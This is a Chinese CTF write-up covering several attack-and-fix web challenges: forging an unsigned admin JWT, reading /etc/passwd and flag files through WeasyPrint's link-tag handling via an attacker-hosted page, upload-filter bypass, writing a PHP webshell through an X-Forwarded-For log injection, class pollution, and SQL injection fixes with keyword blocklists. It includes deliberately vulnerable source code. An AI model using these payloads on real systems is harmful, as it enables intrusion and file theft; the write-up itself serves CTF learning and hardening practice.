先看看JWT构成。

![image-20230915221536301](https://img-blog.csdnimg.cn/img_convert/623973f683fcb857ab242d7389f709bc.png)

然后用脚本伪造空密钥， `isadmin` 为true的JWT。

```python
import base64

def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '{"typ": "JWT","alg": "HS256"}'
payload = '{"username": "admin","isadmin": true}'

print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')

#eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2In0.eyJ1c2VybmFtZSI6ICJhZG1pbiIsImlzYWRtaW4iOiB0cnVlfQ.
python12345678910
```

显然，现在我们已经是admin了。

![image-20230915222128834](https://img-blog.csdnimg.cn/img_convert/72cb5952c84e91da8467246e768fbdd0.png)

---

然后就是利用Python中WeasyPrint库的漏洞读取任意文件，这部分的原题是 `[FireshellCTF2020]URL TO PDF` 。

先看看对输入URL的限制。 `is_valid_url(url)` ，is\_valid\_url函数中又是用 `URL_REGEX.match(url)` 来判断的。归根结底，我们输入的url要满足以下正则表达式。

```
URL_REGEX = re.compile(
    r'http(s)?://'  # http或https
    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
)
1234
```

这段正则表达式 函数 `URL_REGEX()` 用于匹配 URL 地址。下面是它的具体含义：

- `http(s)?://`: 匹配以 “http://” 或 “https://” 开头的部分。其中 `(s)?` 表示 “s” 字符可选，即匹配 “http://” 或 “https://”。
- `(?: ... )+`: 这是一个非捕获分组，用于匹配一个或多个字符。它包含了以下内容：
	- `[a-zA-Z]`: 匹配大小写字母。
		- `[0-9]`: 匹配数字。
		- `[$-_@.&+]`: 匹配一些特殊字符，包括 “$”, “-”, “\_”, “@”, “.”, “&”, “+”。
		- `[!*\(\),]`: 匹配一些其他特殊字符，包括 “!”, “\*”, “(”, “)”, “,”。
		- `(?:%[0-9a-fA-F][0-9a-fA-F])`: 匹配以 “%” 开头的两位十六进制数，通常用于 URL 编码。

综合起来，这个正则表达式可以有效地匹配标准的 URL 地址，包括常见的字符和特殊字符。所以说我们只能输入 `http(s)://什么什么` ，不能直接使用伪协议 `file:///etc/passwd` 。

然后就是利用 `WeasyPrint` 库的漏洞了。

做题时候如果看不见源码，怎么验证是 `WeasyPrint` 库？vps开个监听，然后PDF转换器访问对应端口即可。可以看见在 `U-A` 头里面能看见 `WeasyPrint` ，这也算是一种特征。

![image-20230916103727334](https://img-blog.csdnimg.cn/img_convert/db6ef4482eaee0cad7c1b806a81f2928.png)

`WeasyPrint` 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。

`WeasyPrint` 使用了自己定义的一套HTML标签，使得无法在其上执行JS。但是 `WeasyPrint` 会把所有它支持的东西 都请求一遍然后放在 PDF 里。

这里出现了漏洞，WeasyPrint可以解析解析 `<link>` 标签，当你使用 `<link>` 标签时，他会把标签指向的内容给下下来返回在PDF内。我们在 `<link>` 标签内 `href` 加载 `file://` 就可以实现 SSRF + 任意文件读取。

**开始实战：**

vps上放一个link.html，内容如下：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
<link rel="attachment" href="file:///etc/passwd">
</body>
</html>
html123456789
```

接下来用PDF生成器访问 `http://vps-ip/link.html`

![image-20230916104147215](https://img-blog.csdnimg.cn/img_convert/7837f18c1981c08b66db5e487d53765a.png)

下载下来的 `PDF` 虽说没有显示，但是放到 `binwalk -e 文件名` 后打开解压的文件 中看确实能看到 `file://` 协议读取到的内容，提取出即可。

![image-20230916104319873](https://img-blog.csdnimg.cn/img_convert/69d5662cba13b88d81bea44e33e011ea.png)

同理，我们把 `<link rel="attachment" href="file:///etc/passwd">` 换成 `<link rel="attachment" href="file:///flag">` 就能读取flag文件。

参考文章：

> [挖洞经验 | 打车软件Lyft费用报告导出功能的SSRF漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/239072.html)
> 
> [Hackerone 50m-ctf writeup（第二部分） - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/4901)
> 
> [HackerOne的ssrf漏洞报告 | CN-SEC 中文网](https://cn-sec.com/archives/1330466.html)
> 
> [深入浅出SSRF（二）：我的学习笔记 | 悠远乡 (1dayluo.github.io)](https://1dayluo.github.io/post/shen-ru-qian-chu-ssrfer-wo-de-xue-xi-bi-ji/#%E6%A0%B9%E6%8D%AEpdf-generaterer-%E6%9E%84%E9%80%A0payload-%E4%B9%8B-weasyprint)
> 
> [从PDF导出到SSRF | CTF导航 (ctfiot.com)](https://www.ctfiot.com/100918.html)
> 
> \[[FireshellCTF2020\]web wp | Z3ratu1’s blog](https://blog.z3ratu1.top/%5BFireshell2020%5Dwp.html)
> 
> \[[BUUCTF\]\[FireshellCTF2020\]URL TO PDF\_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/109231974)
> 
> \[[FireshellCTF2020\]URL\_TO\_PDF (proben1.github.io)](https://proben1.github.io/2021/fireshellctf2020url_to_pdf/)

---

\*\*做后补充：\*\*做完想到当时决赛是断网的，不能使用vps。问了一下 `tel` 爷，我们可以在自己插网线的机器上开http，因为和服务器同属于一个内网，访问ip可以访问到。

## \[羊城杯-2023-决赛\] Oh! My PDF (Fix)

初始源码：

```python
from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import jwt
import re
from urllib.parse import urlsplit
from flask_weasyprint import HTML, render_pdf
from werkzeug.security import generate_password_hash, check_password_hash
import os

app = Flask(__name__)

app.config['SECRET_KEY'] = os.urandom(10)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

db = SQLAlchemy(app)

URL_REGEX = re.compile(
    r'http(s)?://'  # http or https
    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    is_admin = db.Column(db.Boolean, nullable=False, default=False)

def create_database(app):
    with app.app_context():
        db.create_all()

def is_valid_url(url):
    if not URL_REGEX.match(url):
        return False
    return True

@app.route('/register', methods=['POST','GET'])
def register():
    if request.method == 'POST':
        try:
            data = request.form
            hashed_password = generate_password_hash(data['password'])
            new_user = User(username=data['username'], password=hashed_password, is_admin=False)
            db.session.add(new_user)
            db.session.commit()

            return render_template('register.html',message='User registered successfully')
        except:
            return render_template('register.html',message='Register Error!'),500
    else:
        return render_template('register.html',message='please register first!')

@app.route('/login', methods=['POST','GET'])
def login():
    if request.method == 'POST':
        data = request.form
        user = User.query.filter_by(username=data['username']).first()
        if user and check_password_hash(user.password, data['password']):
            access_token = jwt.encode(
                {'username': user.username, 'isadmin':False}, app.config['SECRET_KEY'], algorithm="HS256")
            res = make_response(redirect(url_for('ohmypdf')))
            res.set_cookie('access_token',access_token)
            return res, 200
        else:
            return render_template('login.html',message='Invalid username or password'), 500
    else:
        return render_template('login.html'), 200

@app.route('/', methods=['GET', 'POST'])
def ohmypdf():
    access_token = request.cookies.get('access_token')
    if not access_token:
        return redirect(url_for("login"))

    try:
        decoded_token = jwt.decode(
            access_token, app.config['SECRET_KEY'], algorithms=["HS256"],options={"verify_signature": False})
        isadmin = decoded_token['isadmin']
    except:
        return render_template('login.html',message='Invalid access token')

    if not isadmin:
        return render_template('index.html',message='You do not have permission to access this resource. Where is the admin?!'), 403

    if request.method == 'POST':
        url = request.form.get('url')
        if is_valid_url(url):
            try:
                html = HTML(url=url)
                pdf = html.write_pdf()
                response = make_response(pdf)
                response.headers['Content-Type'] = 'application/pdf'
                response.headers['Content-Disposition'] = 'attachment; filename=output.pdf'
                return response
            except Exception as e:
                return f'Error generating PDF', 500
        else:
            return f'Invalid URL!'
    else:
        return render_template("index.html"), 200

if __name__ == '__main__':
    create_database(app)
    app.run(host='0.0.0.0', port=8080)

python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110
```

这题暂时没打听到哪位佬修出来了。个人感觉可以从 `jwt检验密钥` 、 `检验转PDF文件内容` 、 `禁止加载html文件` 、 `换一个PDF库` 这些方面入手。

## \[CISCN 2024 华东南\] welcome (Break)

Ctrl+U拿到flag

![image-20240623090706306](https://img-blog.csdnimg.cn/img_convert/66624b8889e139744ba5ac5e97a9e9aa.png)

## \[CISCN 2024 华东南\] submit (Break)

文件上传，简单绕过

绕过就两个，一个MIMA头，一个等号换php（短标签）

![image-20240623090813296](https://img-blog.csdnimg.cn/img_convert/faec4d772dc64d777ccfd32a1d700d70.png)

![image-20240623090821713](https://img-blog.csdnimg.cn/img_convert/b9e78ac4ed352341f4226a37ff87a7e0.png)

## \[CISCN 2024 华东南\] submit (Fix)

修两个点，一个是后缀检验，一个是waf增加

```php
<?php
// $path = "./uploads";
error_reporting(0);
$path = "./uploads";
$content = file_get_contents($_FILES['myfile']['tmp_name']);
$allow_content_type = array("image/png");
$type = $_FILES["myfile"]["type"];
if (!in_array($type, $allow_content_type)) {
    die("只允许png哦!<br>");
}

//修改点1
$allow_ext = array(".png");
$file_name=$_FILES["myfile"]['name'];
$_FILES["myfile"]['name'] = str_replace(".ph","",$_FILES["myfile"]['name']);
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //收尾去空
if (!in_array($file_ext, $allow_ext)) {
    die("只允许png哦!<br>");
}

//修改点2
if (preg_match('/(php|script|xml|user|htaccess|\<\?|\<\?\=|eval|system|assert|fllllagg|f\*|\/f|cat|POST|GET|\$\_|exec)/i', $content)) {
    // echo "匹配成功!";
    die('鼠鼠说你的内容不符合哦0-0');
} else {
    $file = $path . '/' . $_FILES['myfile']['name'];
    echo $file;

    if (move_uploaded_file($_FILES['myfile']['tmp_name'], $file)) {
        file_put_contents($file, $content);
        echo 'Success!<br>';
    } else {
        echo 'Error!<br>';
    }
}
?>

php12345678910111213141516171819202122232425262728293031323334353637383940
```

## \[CISCN 2024 华东南\] 粗心的程序员 (Break)

www.zip源码泄露。简单代码审计和逻辑漏洞

简单扫一眼，开了sql的PDO（但是最后没用上）

主要漏洞文件：

![image-20240623165632961](https://img-blog.csdnimg.cn/img_convert/13ab082c634acbc589d9ee249d8362cd.png)

贴一下代码：

```php
<?php
error_reporting(0);
include "default_info_auto_recovery.php";
session_start();
$p = $_SERVER["HTTP_X_FORWARDED_FOR"]?:$_SERVER["REMOTE_ADDR"];
if (preg_match("/\?|php|:/i",$p))
{
    die("");
}
$time = date('Y-m-d h:i:s', time());
$username = $_SESSION['username'];
$id = $_SESSION['id'];
if ($username && $id){
    echo "Hello,"."$username";
    $str = "//登陆时间$time,$username $p";
    $str = str_replace("\n","",$str);
    file_put_contents("config.php",file_get_contents("config.php").$str);
}else{
    die("NO ACCESS");
}
?>
<br>
<script type="text/javascript" src="js/jquery-1.9.0.min.js"></script>
<script type="text/javascript" src="js/jquery.base64.js"></script>
<script>
    function submitData(){
        var obj = new Object();
        obj.name = $('#newusername').val();
        var str = $.base64.encode(JSON.stringify(obj.name).replace("\"","").replace("\"",""));
        $.post("edit.php",
            {
                newusername: str
            },
            function(str){
                alert(str);
                location.reload()
            });
    }

    jQuery.base64 = (function($) {

        var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        function utf8Encode(string) {
            string = string.replace(/\r\n/g,"\n");
            var utftext = "";
            for (var n = 0; n < string.length; n++) {
                var c = string.charCodeAt(n);
                if (c < 128) {
                    utftext += String.fromCharCode(c);
                }
                else if((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
                else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
            }
            return utftext;
        }

        function encode(input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;
            input = utf8Encode(input);
            while (i < input.length) {
                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);
                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;
                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }
                output = output +
                    keyStr.charAt(enc1) + keyStr.charAt(enc2) +
                    keyStr.charAt(enc3) + keyStr.charAt(enc4);
            }
            return output;
        }

        return {
            encode: function (str) {
                return encode(str);
            }
        };

    }(jQuery));

</script>
更改用户名<input type="text" name="newusername" id="newusername" value="">
<button type="submit" onclick="submitData()" >更改</button>

php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101
```

简单说一下思路

1、 `$str = "//登陆时间$time,$username $p";`会被写入 ==php== 文件file\_put\_contents(“config.php”,file\_get\_contents(“config.php”).$str);

2、既然是php，写入了如果不是算注释的话就能执行

3、尝试写🐎

4、用户名这边利用`?>` 进行截断注释的作用

5、$p这边进行写🐎

![image-20240623111855983](https://img-blog.csdnimg.cn/img_convert/e5e712571b743621c98c7bebde3a62cd.png)

![image-20240623111902209](https://img-blog.csdnimg.cn/img_convert/aae3ed31f61ca3faad9f48e394d4b3ca.png)

![image-20240623111826823](https://img-blog.csdnimg.cn/img_convert/d8f5e59fef51bfe77107cbb52189456c.png)

![image-20240623111833283](https://img-blog.csdnimg.cn/img_convert/7eedb8a711e75035299c5dfbb6479959.png)

## \[CISCN 2024 华东南\] 粗心的程序员 (Fix)

源码如下

```php
<?php
error_reporting(0);
include "default_info_auto_recovery.php";
session_start();
$p = $_SERVER["HTTP_X_FORWARDED_FOR"]?:$_SERVER["REMOTE_ADDR"];
if (preg_match("/\?|php|:/i",$p))
{
    die("");
}
$time = date('Y-m-d h:i:s', time());
$username = $_SESSION['username'];
$id = $_SESSION['id'];
if ($username && $id){
    echo "Hello,"."$username";
    $str = "//登陆时间$time,$username $p";
    $str = str_replace("\n","",$str);
    file_put_contents("config.php",file_get_contents("config.php").$str);
}else{
    die("NO ACCESS");
}
?>
<br>
<script type="text/javascript" src="js/jquery-1.9.0.min.js"></script>
<script type="text/javascript" src="js/jquery.base64.js"></script>
<script>
    function submitData(){
        var obj = new Object();
        obj.name = $('#newusername').val();
        var str = $.base64.encode(JSON.stringify(obj.name).replace("\"","").replace("\"",""));
        $.post("edit.php",
            {
                newusername: str
            },
            function(str){
                alert(str);
                location.reload()
            });
    }

    jQuery.base64 = (function($) {

        var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        function utf8Encode(string) {
            string = string.replace(/\r\n/g,"\n");
            var utftext = "";
            for (var n = 0; n < string.length; n++) {
                var c = string.charCodeAt(n);
                if (c < 128) {
                    utftext += String.fromCharCode(c);
                }
                else if((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
                else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
            }
            return utftext;
        }

        function encode(input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;
            input = utf8Encode(input);
            while (i < input.length) {
                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);
                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;
                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }
                output = output +
                    keyStr.charAt(enc1) + keyStr.charAt(enc2) +
                    keyStr.charAt(enc3) + keyStr.charAt(enc4);
            }
            return output;
        }

        return {
            encode: function (str) {
                return encode(str);
            }
        };

    }(jQuery));

</script>
更改用户名<input type="text" name="newusername" id="newusername" value="">
<button type="submit" onclick="submitData()" >更改</button>

php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101
```

$username和$ p加waf就行，怎么打的怎么加

```php
<?php
error_reporting(0);
include "default_info_auto_recovery.php";
session_start();
$p = $_SERVER["HTTP_X_FORWARDED_FOR"]?:$_SERVER["REMOTE_ADDR"];
//waf1
if (preg_match("/\?|php|:|system|cat|flaaaaaag|\*|eval|php/i",$p))
{
    die("");
}
$time = date('Y-m-d h:i:s', time());
$username = $_SESSION['username'];
$id = $_SESSION['id'];
//waf2
if (preg_match("/\?|\<\?|php|:/i",$username))
{
    die("");
}

if ($username && $id){
    echo "Hello,"."$username";
    $str = "//登陆时间$time,$username $p";
    $str = str_replace("\n","",$str);
    file_put_contents("config.php",file_get_contents("config.php").$str);
}else{
    die("NO ACCESS");
}
?>
<br>
<script type="text/javascript" src="js/jquery-1.9.0.min.js"></script>
<script type="text/javascript" src="js/jquery.base64.js"></script>
<script>
    function submitData(){
        var obj = new Object();
        obj.name = $('#newusername').val();
        var str = $.base64.encode(JSON.stringify(obj.name).replace("\"","").replace("\"",""));
        $.post("edit.php",
            {
                newusername: str
            },
            function(str){
                alert(str);
                location.reload()
            });
    }

    jQuery.base64 = (function($) {

        var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        function utf8Encode(string) {
            string = string.replace(/\r\n/g,"\n");
            var utftext = "";
            for (var n = 0; n < string.length; n++) {
                var c = string.charCodeAt(n);
                if (c < 128) {
                    utftext += String.fromCharCode(c);
                }
                else if((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
                else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }
            }
            return utftext;
        }

        function encode(input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;
            input = utf8Encode(input);
            while (i < input.length) {
                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);
                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;
                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }
                output = output +
                    keyStr.charAt(enc1) + keyStr.charAt(enc2) +
                    keyStr.charAt(enc3) + keyStr.charAt(enc4);
            }
            return output;
        }

        return {
            encode: function (str) {
                return encode(str);
            }
        };

    }(jQuery));

</script>
更改用户名<input type="text" name="newusername" id="newusername" value="">
<button type="submit" onclick="submitData()" >更改</button>

php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108
```

## \[CISCN 2024 华东南\] Polluted (Fix)

攻击时候没打出来

原来代码

```python
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re

def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')

    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("important.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True, port=80)

python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172
```

修复代码

```python
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re

def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    #修复点1 加waf
    blacklisted_patterns = ['init', 'global', 'env', 'app', 'secret', 'key', 'admin','string', 'proto', 'constructor', 'insert', 'update', 'truncate', 'drop', 'create','doc','str', '_']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')

    #修复点二，乱加的
    if username=='adminer':
        exit(0)
    if username=='admin':
        exit(0)

    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            #其实直接ban了这个就行
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        #修复点三，black一下
        if username == "adminerrrr" and password == app.secret_key:
            return render_template("important.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True, port=80)

python12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879
```

## \[BUUCTF 加固题\] Ezsql

首先连接上ssh。输入账号密码。

![image-20230904154404206](https://img-blog.csdnimg.cn/img_convert/4f2d889abfca9e6dee66ba67668baa42.png)

到 `/var/www/html` 目录下，源码在里面。

![image-20230904154500902](https://img-blog.csdnimg.cn/img_convert/174724acddd7aa10998f2a7816952cf3.png)

主要是看 `index.php` 文件。

```php
<?php
error_reporting(0);
include 'dbConnect.php';
$username = $_GET['username'];
$password = $_GET['password'];
if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $mysqli->query($sql);
    if (!$result)
        die(mysqli_error($mysqli));
    $data = $result->fetch_all(); // 从结果集中获取所有数据
    if (!empty($data)) {
        echo '登录成功！';
    } else {
        echo "用户名或密码错误";
    }
}
?>
php123456789101112131415161718
```

`"SELECT * FROM users WHERE username = '$username' AND password = '$password'"` 很明显的sql注入。修复方式有两种。

**方法一：用addslashes() 函数过滤**

> addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。  
> 预定义字符是：
> 
> - 单引号（'）
> - 双引号（"）
> - 反斜杠（\\）
> - NULL
> 
> 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。

代码中修改部分：

```php
$username = $_GET['username'];
$password = $_GET['password'];

$username = addslashes($username);
$password = addslashes($password);

if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
php12345678
```

**方法二：上WAF**

WAF源码：

```php
$blacklist=['-','+','#','\"','\'','select','sleep',' '];
php1
```

代码中修改部分：

```php
$username = $_GET['username'];
$password = $_GET['password'];

$blacklist=['-','+','#','\"','\'','select','sleep',' '];
$username = str_replace($blacklist,'',$username);
$password = str_replace($blacklist,'',$password);

if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
php123456789
```

这里貌似还有功能检测，不能直接 `preg_match` 正则匹配不执行if。所以采用了黑名单+字符替换。

**方法三：预处理**

预处理算是sql里面的通防了。

原来源码：

```php
<?php
error_reporting(0);
include 'dbConnect.php';
$username = $_GET['username'];
$password = $_GET['password'];
if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $mysqli->query($sql);
    if (!$result)
        die(mysqli_error($mysqli));
    $data = $result->fetch_all(); // 从结果集中获取所有数据
    if (!empty($data)) {
        echo '登录成功！';
    } else {
        echo "用户名或密码错误";
    }
}
?>
php123456789101112131415161718
```

**mysql 预处理** （来自amiaaaz师傅的博客）

![image-20230904170602985](https://img-blog.csdnimg.cn/img_convert/74df3b254fe4c982eb6e67fa3704b1f4.png)

**PDO 预处理** （来自amiaaaz师傅的博客）

![image-20230904170623933](https://img-blog.csdnimg.cn/img_convert/be9d05a12d89448d0e0d10439507740d.png)

---

修复完成后访问check地址的 `/check` 路由。

![image-20230904155134840](https://img-blog.csdnimg.cn/img_convert/12166a84609370d089ec943812766808.png)

稍微等一会后访问check地址的 `/flag` 路由。返回flag就是修复成功。

![image-20230904170514324](https://img-blog.csdnimg.cn/img_convert/8f864112752c7848b79a2ab0527c3460.png)